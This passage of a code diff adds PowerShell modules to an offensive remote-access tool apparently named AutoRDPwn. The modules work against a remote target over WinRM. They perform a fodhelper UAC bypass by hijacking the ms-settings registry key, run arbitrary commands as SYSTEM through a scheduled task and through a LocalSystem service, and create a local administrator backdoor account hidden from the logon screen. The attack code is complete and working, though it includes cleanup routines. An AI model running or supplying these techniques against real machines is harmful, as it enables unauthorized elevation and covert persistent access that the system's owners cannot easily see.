+    $defaultCommand = 'C:\Windows\System32\cmd.exe /c whoami /groups > "' + $proofPath + '" 2>&1'
+    $command = Read-ARValue 'Command to run elevated through fodhelper' $defaultCommand
+    $command = $command.Trim()
+    if ([string]::IsNullOrWhiteSpace($command)) { throw 'The elevated command is empty.' }
+    if ($command -match "[\r\n]") { throw 'The elevated command must be a single line.' }
+    $execute = ((Read-ARValue 'Trigger fodhelper now? (y/n)' 'y') -match '^[Yy]')
+    $session = Get-ARTargetSession
+    # fodhelper.exe auto-elevates and then resolves the ms-settings URI through
+    # the per-user Classes hive, so both values below are what the elevated
+    # process reads. DelegateExecute must exist and be empty for the fallback.
+    $keyPath = 'HKCU:\Software\Classes\ms-settings\shell\open\command'
+    # Phase one reads, phase two writes: the ledger has to hold the previous
+    # state before anything on the target changes.
+    $before = Invoke-ARRemote -Session $session -ArgumentList $keyPath -ScriptBlock {
+        param($key)
+        function Read-ARRegistryEntry {
+            param([string]$Path, [string]$Name)
+            $entry = [pscustomobject]@{ KeyPath = $Path; Name = $Name; Existed = $false; Value = $null; Kind = 'String' }
+            $node = $null
+            try { $node = Get-Item -LiteralPath $Path -ErrorAction Stop } catch { return $entry }
+            $lookup = $Name
+            if ($Name -eq '(default)') { $lookup = '' }
+            if (@($node.GetValueNames()) -contains $lookup) {
+                $entry.Existed = $true
+                try { $entry.Value = [string]$node.GetValue($lookup, '') } catch { $entry.Value = '' }
+                if ($lookup -ne '') { try { $entry.Kind = [string]$node.GetValueKind($lookup) } catch { } }
+            }
+            return $entry
+        }
+        $keyExisted = $false
+        try { $keyExisted = Test-Path -LiteralPath $key } catch { $keyExisted = $false }
+        return [pscustomobject]@{
+            KeyExisted = [bool]$keyExisted
+            Default    = (Read-ARRegistryEntry -Path $key -Name '(default)')
+            Delegate   = (Read-ARRegistryEntry -Path $key -Name 'DelegateExecute')
+        }
+    }
+    foreach ($entry in @($before.Default, $before.Delegate)) {
+        if ($null -eq $entry) { continue }
+        # Oldest snapshot wins: a second run must not record what it just wrote.
+        $known = $false
+        foreach ($existing in $script:ARRegistryBackup) {
+            if ($existing.KeyPath -eq $entry.KeyPath -and $existing.Name -eq $entry.Name) { $known = $true; break }
+        }
+        if (-not $known) { $script:ARRegistryBackup.Add($entry) }
+    }
+    $result = Invoke-ARRemote -Session $session -ArgumentList $keyPath, $command -ScriptBlock {
+        param($key, $commandLine)
+        New-Item -Path $key -Force -ErrorAction Stop | Out-Null
+        # Set-Item writes the default value of the key; New-ItemProperty cannot.
+        Set-Item -Path $key -Value $commandLine -ErrorAction Stop
+        New-ItemProperty -Path $key -Name 'DelegateExecute' -Value '' -PropertyType String -Force -ErrorAction Stop | Out-Null
+        $node = Get-Item -LiteralPath $key -ErrorAction Stop
+        return [pscustomobject]@{
+            Command     = [string]$node.GetValue('', '')
+            DelegateSet = [string]$node.GetValue('DelegateExecute', '')
+        }
+    }
+    Write-ARSuccess ('Hijack written: ' + $keyPath)
+    Write-ARInfo ('  (default) = ' + [string]$result.Command)
+    Write-ARInfo ('  DelegateExecute = "' + [string]$result.DelegateSet + '" (present and empty)')
+    $beforeText = 'absent'
+    if ([bool]$before.Default.Existed) { $beforeText = '"' + [string]$before.Default.Value + '"' }
+    $delegateText = 'absent'
+    if ([bool]$before.Delegate.Existed) { $delegateText = 'present' }
+    Write-ARInfo ('  previous (default): ' + $beforeText + '; previous DelegateExecute: ' + $delegateText)
+    if ($command.Contains($proofPath) -and -not $script:ARModuleFiles.Contains($proofPath)) { $script:ARModuleFiles.Add($proofPath) }
+    $triggerError = ''
+    try {
+        if ($execute) {
+            $triggerError = [string](Invoke-ARRemote -Session $session -ScriptBlock {
+                $binary = Join-Path $env:SystemRoot 'System32\fodhelper.exe'
+                if (-not (Test-Path -LiteralPath $binary)) { return 'fodhelper.exe is missing from System32' }
+                try { Start-Process -FilePath $binary -ErrorAction Stop; return '' }
+                catch { return $_.Exception.Message }
+            })
+            if ($triggerError -ne '') { Write-ARWarn ('fodhelper could not be started: ' + $triggerError) }
+            else { Write-ARInfo 'fodhelper.exe started; the command runs with the elevated token, in session 0 when this runs over WinRM.' }
+        }
+        else { Write-ARInfo 'Hijack left in place and not triggered; it is reverted before this action returns.' }
+        if ($execute -and $command.Contains($proofPath)) {
+            $proof = ''
+            for ($attempt = 0; $attempt -lt 15; $attempt++) {
+                Start-Sleep -Seconds 1
+                $proof = [string](Invoke-ARRemote -Session $session -ArgumentList $proofPath -ScriptBlock {
+                    param($path)
+                    if (-not (Test-Path -LiteralPath $path)) { return '' }
+                    try { return [System.IO.File]::ReadAllText($path) } catch { return '' }
+                })
+                if (-not [string]::IsNullOrWhiteSpace($proof)) { break }
+            }
+            if ([string]::IsNullOrWhiteSpace($proof)) { Write-ARWarn 'No proof file appeared: the elevated command did not run, or it wrote nowhere visible.' }
+            else {
+                Write-ARSuccess 'Elevated command produced this output:'
+                $lines = @(($proof.Trim() -split "`r?`n") | Select-Object -First 40)
+                Show-ARText ($lines -join "`n")
+            }
+        }
+    }
+    finally {
+        # The default value of a registry key cannot be deleted by name, so the
+        # session replay cannot undo it: this handler puts the key back itself.
+        # The ledger entry stays as the second line of defence for DelegateExecute.
+        try {
+            Invoke-ARRemote -Session $session -ArgumentList $keyPath, [bool]$before.KeyExisted, [string]$before.Default.Value, [bool]$before.Default.Existed, [string]$before.Delegate.Value, [bool]$before.Delegate.Existed -ScriptBlock {
+                param($key, $keyExisted, $defaultValue, $defaultExisted, $delegateValue, $delegateExisted)
+                if (-not $keyExisted) {
+                    Remove-Item -LiteralPath $key -Recurse -Force -ErrorAction SilentlyContinue
+                    $parent = Split-Path -Parent $key
+                    for ($step = 0; $step -lt 4; $step++) {
+                        if ([string]::IsNullOrWhiteSpace($parent)) { break }
+                        if (-not (Test-Path -LiteralPath $parent)) { $parent = Split-Path -Parent $parent; continue }
+                        $node = Get-Item -LiteralPath $parent -ErrorAction SilentlyContinue
+                        if ($null -eq $node) { break }
+                        if (@($node.GetValueNames()).Count -gt 0) { break }
+                        if (@($node.GetSubKeyNames()).Count -gt 0) { break }
+                        Remove-Item -LiteralPath $parent -Recurse -Force -ErrorAction SilentlyContinue
+                        $parent = Split-Path -Parent $parent
+                    }
+                    return
+                }
+                if ($defaultExisted) { Set-Item -Path $key -Value ([string]$defaultValue) -ErrorAction SilentlyContinue }
+                else { Set-Item -Path $key -Value '' -ErrorAction SilentlyContinue }
+                if ($delegateExisted) {
+                    New-ItemProperty -Path $key -Name 'DelegateExecute' -Value ([string]$delegateValue) -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
+                }
+                else { Remove-ItemProperty -Path $key -Name 'DelegateExecute' -Force -ErrorAction SilentlyContinue }
+            } | Out-Null
+            Write-ARInfo 'Registry state restored: the hijacked key holds its previous values again.'
+        }
+        catch { Write-ARWarn ('Registry restore incomplete: ' + $_.Exception.Message) }
+        if ($command.Contains($proofPath)) {
+            try {
+                Invoke-ARRemote -Session $session -ArgumentList $proofPath -ScriptBlock {
+                    param($path)
+                    Remove-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue
+                } | Out-Null
+            }
+            catch { }
+            [void]$script:ARModuleFiles.Remove($proofPath)
+        }
+    }
+    Set-ARStatus 'UAC bypass (fodhelper) finished' 'Ok'
+}
+
+function Invoke-ARModuleSystemTask {
+    param([switch]$Remove)
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'SYSTEM scheduled task'
+    $session = Get-ARTargetSession
+    $operation = '1'
+    if ($Remove) { $operation = '2' }
+    elseif (-not $script:ARInvokedFromOption) { $operation = Read-ARValue 'Operation (1 create or update, 2 remove)' '1' }
+    if ($operation -match '^2') {
+        $ledger = New-Object System.Collections.Generic.List[string]
+        if (Get-Variable -Name ARRemoteTasks -Scope Script -ErrorAction SilentlyContinue) {
+            foreach ($name in @($script:ARRemoteTasks.ToArray())) {
+                if (([string]$name).StartsWith('AutoRDPwnSys')) { $ledger.Add([string]$name) }
+            }
+        }
+        $removed = @(Invoke-ARRemote -Session $session -ArgumentList @($ledger.ToArray()) -ScriptBlock {
+            param($names)
+            $deleted = New-Object System.Collections.Generic.List[string]
+            foreach ($name in @($names)) {
+                $existing = Get-ScheduledTask -TaskName ([string]$name) -ErrorAction SilentlyContinue
+                Unregister-ScheduledTask -TaskName ([string]$name) -Confirm:$false -ErrorAction SilentlyContinue
+                if ($null -ne $existing) { $deleted.Add([string]$name) }
+            }
+            # Interrupted runs leave the prefix behind; the sweep uses the same one.
+            foreach ($task in @(Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { [string]$_.TaskName -like 'AutoRDPwnSys*' })) {
+                Unregister-ScheduledTask -TaskName ([string]$task.TaskName) -Confirm:$false -ErrorAction SilentlyContinue
+                if (-not $deleted.Contains([string]$task.TaskName)) { $deleted.Add([string]$task.TaskName) }
+            }
+            return $deleted.ToArray()
+        })
+        foreach ($name in @($removed)) {
+            if (Get-Variable -Name ARRemoteTasks -Scope Script -ErrorAction SilentlyContinue) { [void]$script:ARRemoteTasks.Remove([string]$name) }
+            Write-ARSuccess ('Removed task: ' + [string]$name)
+        }
+        if (@($removed).Count -eq 0) { Write-ARInfo 'No AutoRDPwn SYSTEM task is registered on the target.' }
+        Set-ARStatus 'SYSTEM task removal finished' 'Ok'
+        return
+    }
+    $proofPath = 'C:\Windows\Temp\' + (New-ARRemoteTempName '.txt')
+    $defaultCommand = 'C:\Windows\System32\cmd.exe /c whoami /groups > "' + $proofPath + '" 2>&1'
+    $command = Read-ARValue 'Command to run as SYSTEM' $defaultCommand
+    $command = $command.Trim()
+    if ([string]::IsNullOrWhiteSpace($command)) { throw 'The SYSTEM command is empty.' }
+    if ($command -match "[\r\n]") { throw 'The SYSTEM command must be a single line.' }
+    $executable = $command
+    $arguments = ''
+    if ($command.StartsWith('"')) {
+        $closing = $command.IndexOf('"', 1)
+        if ($closing -gt 1) {
+            $executable = $command.Substring(1, $closing - 1)
+            $arguments = $command.Substring($closing + 1).Trim()
+        }
+    }
+    else {
+        $space = $command.IndexOf(' ')
+        if ($space -gt 0) {
+            $executable = $command.Substring(0, $space)
+            $arguments = $command.Substring($space + 1).Trim()
+        }
+    }
+    if ([string]::IsNullOrWhiteSpace($executable)) { throw 'The SYSTEM command has no executable.' }
+    $taskName = 'AutoRDPwnSys' + (New-ARModuleToken -Length 6)
+    $result = Invoke-ARRemote -Session $session -ArgumentList $taskName, $executable, $arguments -ScriptBlock {
+        param($name, $execute, $argumentText)
+        # Register-ScheduledTask -Force makes a repeat run an update, not a duplicate.
+        $action = New-ScheduledTaskAction -Execute $execute -Argument $argumentText
+        $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+        Register-ScheduledTask -TaskName $name -Action $action -Principal $principal -Force -ErrorAction Stop | Out-Null
+        $registered = Get-ScheduledTask -TaskName $name -ErrorAction Stop
+        Start-ScheduledTask -TaskName $name -ErrorAction Stop
+        $running = Get-ScheduledTask -TaskName $name -ErrorAction SilentlyContinue
+        return [pscustomobject]@{
+            Name  = [string]$registered.TaskName
+            State = [string]$running.State
+            User  = [string]$registered.Principal.UserId
+            Run   = [string]$registered.Principal.RunLevel
+        }
+    }
+    if (Get-Variable -Name ARRemoteTasks -Scope Script -ErrorAction SilentlyContinue) {
+        if (-not $script:ARRemoteTasks.Contains($taskName)) { $script:ARRemoteTasks.Add($taskName) }
+    }
+    Write-ARSuccess ('Task registered: ' + $taskName + ' (user ' + [string]$result.User + ', run level ' + [string]$result.Run + ', state ' + [string]$result.State + ')')
+    Write-ARInfo ('Command: ' + $command)
+    if ($command.Contains($proofPath)) {
+        if (-not $script:ARModuleFiles.Contains($proofPath)) { $script:ARModuleFiles.Add($proofPath) }
+        $proof = ''
+        for ($attempt = 0; $attempt -lt 20; $attempt++) {
+            Start-Sleep -Seconds 1
+            $proof = [string](Invoke-ARRemote -Session $session -ArgumentList $proofPath -ScriptBlock {
+                param($path)
+                if (-not (Test-Path -LiteralPath $path)) { return '' }
+                try { return [System.IO.File]::ReadAllText($path) } catch { return '' }
+            })
+            if (-not [string]::IsNullOrWhiteSpace($proof)) { break }
+        }
+        if ([string]::IsNullOrWhiteSpace($proof)) { Write-ARWarn 'No proof file appeared: check the task history, the command may have failed inside session 0.' }
+        else {
+            Write-ARSuccess 'The task wrote this identity proof:'
+            Show-ARText (@(($proof.Trim() -split "`r?`n") | Select-Object -First 40) -join "`n")
+        }
+        try {
+            Invoke-ARRemote -Session $session -ArgumentList $proofPath -ScriptBlock {
+                param($path)
+                Remove-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue
+            } | Out-Null
+        }
+        catch { }
+        [void]$script:ARModuleFiles.Remove($proofPath)
+    }
+    Write-ARInfo ('The task stays registered until session cleanup or a removal run: ' + $taskName)
+    Write-ARInfo 'Run once as SYSTEM and gone: this task is not a logon trigger, it has no schedule.'
+    Set-ARStatus 'SYSTEM task registered' 'Ok'
+}
+
+function Invoke-ARModuleSystemService {
+    param([switch]$Remove)
+    # 01-core owns no service collection yet; the guarded declaration keeps this
+    # handler self-contained and idempotent when it is dot-sourced twice.
+    if ($null -eq (Get-Variable -Name ARCreatedServices -Scope Script -ErrorAction SilentlyContinue)) {
+        $script:ARCreatedServices = New-Object System.Collections.Generic.List[string]
+    }
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'SYSTEM service'
+    $session = Get-ARTargetSession
+    $operation = '1'
+    if ($Remove) { $operation = '2' }
+    elseif (-not $script:ARInvokedFromOption) { $operation = Read-ARValue 'Operation (1 create and run, 2 remove)' '1' }
+    if ($operation -match '^2') {
+        $ledger = New-Object System.Collections.Generic.List[string]
+        foreach ($name in @($script:ARCreatedServices.ToArray())) { $ledger.Add([string]$name) }
+        $removed = @(Invoke-ARRemote -Session $session -ArgumentList @($ledger.ToArray()) -ScriptBlock {
+            param($names)
+            $deleted = New-Object System.Collections.Generic.List[string]
+            $all = New-Object System.Collections.Generic.List[string]
+            foreach ($name in @($names)) { if (-not [string]::IsNullOrWhiteSpace([string]$name)) { $all.Add([string]$name) } }
+            foreach ($service in @(Get-Service -Name 'AutoRDPwnSvc*' -ErrorAction SilentlyContinue)) { if (-not $all.Contains([string]$service.Name)) { $all.Add([string]$service.Name) } }
+            foreach ($name in @($all.ToArray())) {
+                $existed = ($null -ne (Get-Service -Name $name -ErrorAction SilentlyContinue))
+                & sc.exe stop $name 2>&1 | Out-Null
+                for ($spin = 0; $spin -lt 20; $spin++) {
+                    if ($null -eq (Get-Service -Name $name -ErrorAction SilentlyContinue)) { break }
+                    if ([string](Get-Service -Name $name -ErrorAction SilentlyContinue).Status -eq 'Stopped') { break }
+                    Start-Sleep -Milliseconds 250
+                }
+                & sc.exe delete $name 2>&1 | Out-Null
+                for ($spin = 0; $spin -lt 20; $spin++) {
+                    if ($null -eq (Get-Service -Name $name -ErrorAction SilentlyContinue)) { break }
+                    Start-Sleep -Milliseconds 250
+                }
+                $gone = ($null -eq (Get-Service -Name $name -ErrorAction SilentlyContinue))
+                if ($existed -and $gone) { $deleted.Add($name) }
+            }
+            return $deleted.ToArray()
+        })
+        foreach ($name in @($removed)) {
+            [void]$script:ARCreatedServices.Remove([string]$name)
+            Write-ARSuccess ('Removed service: ' + [string]$name)
+        }
+        if (@($removed).Count -eq 0) { Write-ARInfo 'No AutoRDPwn service is registered on the target.' }
+        Set-ARStatus 'SYSTEM service removal finished' 'Ok'
+        return
+    }
+    $proofPath = 'C:\Windows\Temp\' + (New-ARRemoteTempName '.txt')
+    $defaultCommand = 'C:\Windows\System32\cmd.exe /c whoami /priv > "' + $proofPath + '" 2>&1'
+    $command = Read-ARValue 'Command to run as LocalSystem' $defaultCommand
+    $command = $command.Trim()
+    if ([string]::IsNullOrWhiteSpace($command)) { throw 'The LocalSystem command is empty.' }
+    if ($command -match "[\r\n]") { throw 'The LocalSystem command must be a single line.' }
+    $executable = $command
+    $arguments = ''
+    if ($command.StartsWith('"')) {
+        $closing = $command.IndexOf('"', 1)
+        if ($closing -gt 1) {
+            $executable = $command.Substring(1, $closing - 1)
+            $arguments = $command.Substring($closing + 1).Trim()
+        }
+    }
+    else {
+        $space = $command.IndexOf(' ')
+        if ($space -gt 0) {
+            $executable = $command.Substring(0, $space)
+            $arguments = $command.Substring($space + 1).Trim()
+        }
+    }
+    if ([string]::IsNullOrWhiteSpace($executable)) { throw 'The LocalSystem command has no executable.' }
+    $serviceName = 'AutoRDPwnSvc' + (New-ARModuleToken -Length 6)
+    $result = $null
+    try {
+        $result = Invoke-ARRemote -Session $session -ArgumentList $serviceName, $executable, $arguments -ScriptBlock {
+            param($name, $execute, $argumentText)
+            # Deterministic name per run: drop a stale copy so create stays a create.
+            if ($null -ne (Get-Service -Name $name -ErrorAction SilentlyContinue)) {
+                & sc.exe stop $name 2>&1 | Out-Null
+                & sc.exe delete $name 2>&1 | Out-Null
+                for ($spin = 0; $spin -lt 20; $spin++) {
+                    if ($null -eq (Get-Service -Name $name -ErrorAction SilentlyContinue)) { break }
+                    Start-Sleep -Milliseconds 250
+                }
+            }
+            $binPath = '"' + $execute + '"'
+            if (-not [string]::IsNullOrWhiteSpace($argumentText)) { $binPath = $binPath + ' ' + $argumentText }
+            # New-Service writes BinaryPathName verbatim and leaves the account at the
+            # LocalSystem default; sc.exe create loses the embedded quotes that a
+            # spaced path needs on the PowerShell to native argument round trip.
+            New-Service -Name $name -BinaryPathName $binPath -DisplayName 'AutoRDPwn helper' -StartupType Manual -ErrorAction Stop | Out-Null
+            $startOutput = [string](& sc.exe start $name 2>&1 | Out-String)
+            $startCode = $LASTEXITCODE
+            Start-Sleep -Seconds 2
+            $service = Get-Service -Name $name -ErrorAction SilentlyContinue
+            $state = 'missing'
+            if ($null -ne $service) { $state = [string]$service.Status }
+            return [pscustomobject]@{
+                Name        = $name
+                BinPath     = $binPath
+                Created     = $true
+                StartCode   = [int]$startCode
+                StartOutput = $startOutput.Trim()
+                State       = $state
+            }
+        }
+        if (-not $script:ARCreatedServices.Contains($serviceName)) { $script:ARCreatedServices.Add($serviceName) }
+        Write-ARSuccess ('Service created: ' + $serviceName + ' (LocalSystem, start= demand)')
+        Write-ARInfo ('  binPath = ' + [string]$result.BinPath)
+        if ([int]$result.StartCode -ne 0) {
+            # 1053 is expected for a one-shot command: the process ran and exited.
+            Write-ARInfo ('  sc start exit ' + [string]$result.StartCode + ': ' + [string]$result.StartOutput)
+            Write-ARInfo '  A 1053 here means the command ran and exited before reporting back, which is normal for a one-shot payload.'
+        }
+        else { Write-ARInfo ('  service state now: ' + [string]$result.State) }
+        if ($command.Contains($proofPath)) {
+            if (-not $script:ARModuleFiles.Contains($proofPath)) { $script:ARModuleFiles.Add($proofPath) }
+            $proof = ''
+            for ($attempt = 0; $attempt -lt 20; $attempt++) {
+                Start-Sleep -Seconds 1
+                $proof = [string](Invoke-ARRemote -Session $session -ArgumentList $proofPath -ScriptBlock {
+                    param($path)
+                    if (-not (Test-Path -LiteralPath $path)) { return '' }
+                    try { return [System.IO.File]::ReadAllText($path) } catch { return '' }
+                })
+                if (-not [string]::IsNullOrWhiteSpace($proof)) { break }
+            }
+            if ([string]::IsNullOrWhiteSpace($proof)) { Write-ARWarn 'No proof file appeared: the service command may have failed before writing anything.' }
+            else {
+                Write-ARSuccess 'The service ran this command as LocalSystem:'
+                Show-ARText (@(($proof.Trim() -split "`r?`n") | Select-Object -First 40) -join "`n")
+            }
+        }
+    }
+    finally {
+        # A LocalSystem service is never left behind: this handler deletes the
+        # one it created even when the body above threw.
+        try {
+            Invoke-ARRemote -Session $session -ArgumentList $serviceName -ScriptBlock {
+                param($name)
+                & sc.exe stop $name 2>&1 | Out-Null
+                for ($spin = 0; $spin -lt 20; $spin++) {
+                    if ($null -eq (Get-Service -Name $name -ErrorAction SilentlyContinue)) { break }
+                    if ([string](Get-Service -Name $name -ErrorAction SilentlyContinue).Status -eq 'Stopped') { break }
+                    Start-Sleep -Milliseconds 250
+                }
+                & sc.exe delete $name 2>&1 | Out-Null
+                for ($spin = 0; $spin -lt 20; $spin++) {
+                    if ($null -eq (Get-Service -Name $name -ErrorAction SilentlyContinue)) { break }
+                    Start-Sleep -Milliseconds 250
+                }
+                return ($null -eq (Get-Service -Name $name -ErrorAction SilentlyContinue))
+            } | Out-Null
+            Write-ARInfo ('Service removed: ' + $serviceName + ' (nothing is left registered)')
+        }
+        catch { Write-ARWarn ('Service removal incomplete: ' + $_.Exception.Message + ' â€” remove ' + $serviceName + ' manually with sc.exe delete.') }
+        [void]$script:ARCreatedServices.Remove($serviceName)
+        if ($command.Contains($proofPath)) {
+            try {
+                Invoke-ARRemote -Session $session -ArgumentList $proofPath -ScriptBlock {
+                    param($path)
+                    Remove-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue
+                } | Out-Null
+            }
+            catch { }
+            [void]$script:ARModuleFiles.Remove($proofPath)
+        }
+    }
+    Set-ARStatus 'SYSTEM service run finished' 'Ok'
+}
+
+function Invoke-ARModuleBackdoorAccount {
+    param([switch]$Remove)
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Local administrator account'
+    $session = Get-ARTargetSession
+    $hidePath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
+    $operation = '1'
+    if ($Remove) { $operation = '2' }
+    elseif (-not $script:ARInvokedFromOption) { $operation = Read-ARValue 'Operation (1 create, 2 remove the accounts this session created)' '1' }
+    if ($operation -match '^2') {
+        $ledger = New-Object System.Collections.Generic.List[string]
+        if (Get-Variable -Name ARCreatedAccounts -Scope Script -ErrorAction SilentlyContinue) {
+            # 'AutoRDPwn' belongs to the PSexec handler and is not this action's to delete.
+            foreach ($name in @($script:ARCreatedAccounts.ToArray())) {
+                if ([string]$name -ne 'AutoRDPwn' -and -not [string]::IsNullOrWhiteSpace([string]$name)) { $ledger.Add([string]$name) }
+            }
+        }
+        $removed = @(Invoke-ARRemote -Session $session -ArgumentList @($ledger.ToArray()) -ScriptBlock {
+            param($names)
+            $deleted = New-Object System.Collections.Generic.List[string]
+            $hide = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
+            foreach ($name in @($names)) {
+                $existed = ($null -ne (Get-LocalUser -Name ([string]$name) -ErrorAction SilentlyContinue))
+                & net.exe user ([string]$name) /delete 2>&1 | Out-Null
+                $gone = ($null -eq (Get-LocalUser -Name ([string]$name) -ErrorAction SilentlyContinue))
+                if ($existed -and $gone) { $deleted.Add([string]$name) }
+                else {
+                    try { Remove-ItemProperty -Path $hide -Name ([string]$name) -Force -ErrorAction SilentlyContinue } catch { }
+                    continue
+                }
+                try { Remove-ItemProperty -Path $hide -Name ([string]$name) -Force -ErrorAction SilentlyContinue } catch { }
+            }
+            # The hide key is only ever created for these accounts; prune it when empty.
+            $list = Get-Item -LiteralPath $hide -ErrorAction SilentlyContinue
+            if ($null -ne $list) {
+                $empty = ((@($list.GetValueNames()).Count -eq 0) -and (@($list.GetSubKeyNames()).Count -eq 0))
+                if ($empty) {
+                    Remove-Item -LiteralPath $hide -Recurse -Force -ErrorAction SilentlyContinue
+                    $parent = Split-Path -Parent $hide
+                    $node = Get-Item -LiteralPath $parent -ErrorAction SilentlyContinue
+                    if ($null -ne $node) {
+                        if ((@($node.GetValueNames()).Count -eq 0) -and (@($node.GetSubKeyNames()).Count -eq 0)) {
+                            Remove-Item -LiteralPath $parent -Recurse -Force -ErrorAction SilentlyContinue
+                        }
+                    }
+                }
+            }
+            return $deleted.ToArray()
+        })
+        foreach ($name in @($removed)) {
+            if (Get-Variable -Name ARCreatedAccounts -Scope Script -ErrorAction SilentlyContinue) { [void]$script:ARCreatedAccounts.Remove([string]$name) }
+            Write-ARSuccess ('Removed account: ' + [string]$name)
+        }
+        if (@($removed).Count -eq 0) { Write-ARInfo 'No account created by this tool is left on the target.' }
+        Set-ARStatus 'Backdoor account removal finished' 'Ok'
+        return
+    }
+    $generatedName = 'ardpwn' + (New-ARModuleToken -Length 6)
+    $accountName = $generatedName
+    if (-not $script:ARInvokedFromOption) { $accountName = Read-ARValue 'Account name' $generatedName }
+    $accountName = $accountName.Trim()
+    if ($accountName -notmatch '^[A-Za-z0-9._-]{1,20}$') { throw 'The account name must be 1-20 characters of letters, digits, dot, dash or underscore.' }
+    $reserved = @('administrator', 'guest', 'defaultaccount', 'wdagutilityaccount', 'system', 'localservice', 'networkservice')
+    if ($reserved -contains $accountName.ToLowerInvariant()) { throw ('The account name "' + $accountName + '" is reserved on Windows.') }
+    $password = 'generate'
+    if (-not $script:ARInvokedFromOption) { $password = Read-ARValue 'Password (the default generates one)' 'generate' }
+    if ([string]::IsNullOrWhiteSpace($password) -or $password -eq 'generate') {
+        # One character from each class first, then random fill: the policy check
+        # cannot fail because of the generator.
+        $upper = 'ABCDEFGHJKLMNPQRSTUVWXYZ'
+        $lower = 'abcdefghijkmnopqrstuvwxyz'
+        $digits = '23456789'
+        $symbols = '!@#%*-_=+'
+        $everything = $upper + $lower + $digits + $symbols
+        $bytes = New-Object 'byte[]' 1
+        $generator = [System.Security.Cryptography.RandomNumberGenerator]::Create()
+        $builder = New-Object System.Text.StringBuilder
+        try {
+            foreach ($set in @($upper, $lower, $digits, $symbols)) {
+                $generator.GetBytes($bytes)
+                [void]$builder.Append($set[([int]$bytes[0] % $set.Length)])
+            }
+            while ($builder.Length -lt 20) {
+                $generator.GetBytes($bytes)
+                [void]$builder.Append($everything[([int]$bytes[0] % $everything.Length)])
+            }
+        }
+        finally { $generator.Dispose() }
+        $password = $builder.ToString()
+    }
+    # Recorded before the write: a transport failure after net user /add still
+    # leaves the name where the session cleanup looks for it.
+    if (Get-Variable -Name ARCreatedAccounts -Scope Script -ErrorAction SilentlyContinue) {
+        if (-not $script:ARCreatedAccounts.Contains($accountName)) { $script:ARCreatedAccounts.Add($accountName) }
+    }
+    $result = Invoke-ARRemote -Session $session -ArgumentList $accountName, $password, $hidePath -ScriptBlock {
+        param($userName, $plain, $hide)
+        $addOutput = [string](& net.exe user $userName $plain /add 2>&1 | Out-String)
+        $addCode = $LASTEXITCODE
+        if ($addCode -ne 0) {
+            return [pscustomobject]@{ Added = $false; Reason = $addOutput.Trim(); InAdmin = $false; AdminError = ''; Hidden = $false; HideError = ''; HideKeyExisted = $false; HideValueExisted = $false; HidePrior = 0 }
+        }
+        $inAdmin = $false
+        $adminError = ''
+        try {
+            # SID first: 'Administrators' is localized, S-1-5-32-544 is not.
+            $group = Get-LocalGroup -SID 'S-1-5-32-544' -ErrorAction Stop
+            Add-LocalGroupMember -Group $group -Member $userName -ErrorAction Stop
+            $inAdmin = $true
+        }
+        catch {
+            $adminError = $_.Exception.Message
+            # 'Administrators' is localized; resolve the SID first and hand net.exe
+            # the localized name it expects.
+            $groupName = 'Administrators'
+            try { $groupName = (New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount]).Value } catch { }
+            & net.exe localgroup $groupName $userName /add 2>&1 | Out-Null
+            if ($LASTEXITCODE -eq 0) { $inAdmin = $true; $adminError = '' }
+        }
+        $hideKeyExisted = $false
+        try { $hideKeyExisted = Test-Path -LiteralPath $hide } catch { $hideKeyExisted = $false }
+        $hideValueExisted = $false
+        $hidePrior = 0
+        if ($hideKeyExisted) {
+            $node = Get-Item -LiteralPath $hide -ErrorAction SilentlyContinue
+            if ($null -ne $node) {
+                if (@($node.GetValueNames()) -contains $userName) {
+                    $hideValueExisted = $true
+                    try { $hidePrior = [int]$node.GetValue($userName, 1) } catch { $hidePrior = 1 }
+                }
+            }
+        }
+        $hidden = $false
+        $hideError = ''
+        try {
+            New-Item -Path $hide -Force -ErrorAction Stop | Out-Null
+            New-ItemProperty -Path $hide -Name $userName -Value 0 -PropertyType DWord -Force -ErrorAction Stop | Out-Null
+            $hidden = $true
+        }
+        catch { $hideError = $_.Exception.Message }
+        $check = Get-LocalUser -Name $userName -ErrorAction SilentlyContinue
+        $enabled = $false
+        if ($null -ne $check) { $enabled = [bool]$check.Enabled }
+        return [pscustomobject]@{
+            Added            = $true
+            Reason           = ''
+            InAdmin          = $inAdmin
+            AdminError       = $adminError
+            Hidden           = $hidden
+            HideError        = $hideError
+            HideKeyExisted   = $hideKeyExisted
+            HideValueExisted = $hideValueExisted
+            HidePrior        = $hidePrior
+            Enabled          = $enabled
+        }
+    }
+    if (-not [bool]$result.Added) {
+        if (Get-Variable -Name ARCreatedAccounts -Scope Script -ErrorAction SilentlyContinue) { [void]$script:ARCreatedAccounts.Remove($accountName) }
+        throw ('net user /add failed: ' + [string]$result.Reason)
+    }
+    $entry = [pscustomobject]@{
+        KeyPath = $hidePath
+        Name    = $accountName
+        Existed = [bool]$result.HideValueExisted
+        Value   = [int]$result.HidePrior
+        Kind    = 'DWord'
+    }
+    $known = $false
+    foreach ($existing in $script:ARRegistryBackup) {
+        if ($existing.KeyPath -eq $entry.KeyPath -and $existing.Name -eq $entry.Name) { $known = $true; break }
+    }
+    if (-not $known) { $script:ARRegistryBackup.Add($entry) }
+    Write-ARSuccess ('Account created: ' + $accountName + ' (enabled=' + [string]$result.Enabled + ')')
+    if ([bool]$result.InAdmin) { Write-ARInfo 'Added to the local Administrators group (S-1-5-32-544).' }
+    else { Write-ARWarn ('The account was created but the Administrators group add failed: ' + [string]$result.AdminError) }
+    if ([bool]$result.Hidden) {
+        Write-ARInfo ('Hidden from the logon screen through ' + $hidePath + ' (value 0, registered for restore).')
+    }
+    else { Write-ARWarn ('The logon-screen hide value could not be written: ' + [string]$result.HideError) }
+    Write-Host ''
